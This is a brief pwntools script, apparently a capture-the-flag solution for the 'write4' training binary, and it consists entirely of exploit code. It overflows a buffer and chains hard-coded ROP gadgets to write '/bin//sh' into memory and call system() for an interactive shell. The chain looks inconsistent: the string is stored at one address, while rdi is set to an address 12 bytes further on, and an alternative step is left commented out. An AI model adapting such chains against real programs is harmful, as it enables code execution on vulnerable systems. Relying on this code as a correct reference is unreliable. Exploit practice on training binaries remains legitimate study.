from pwn import *

context(arch='amd64', os='linux')
binary_name = 'write4'
p = process('./'+binary_name)
elf =  ELF(binary_name)
rop =  ROP(elf)

system = elf.sym["system"] 
log.info("System address (.plt): " + hex(system))

pop_r14_r15_ret = 0x400890
pop_r15_ret =     0x400892
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
writewhatwhere  = 0x400821
writable_memory = 0x601050
exit            = 0x400805

rop =  "A"*40
rop += p64(pop_r14_r15_ret) + p64(writable_memory) + p64(writable_memory) 
rop += p64(pop_r15_ret) + "/bin//sh"
rop += p64(writewhatwhere)

''' 
rop += p64(pop_r14_r15_ret) + p64(writable_memory+12) + p64(writable_memory+12) 
rop += p64(pop_r15_ret) + p64(writable_memory)
rop += p64(writewhatwhere)
'''

rop += p64(pop_rdi) + p64(writable_memory+12) + p64(system)

p.recvuntil("> ")
p.send(rop)
p.interactive()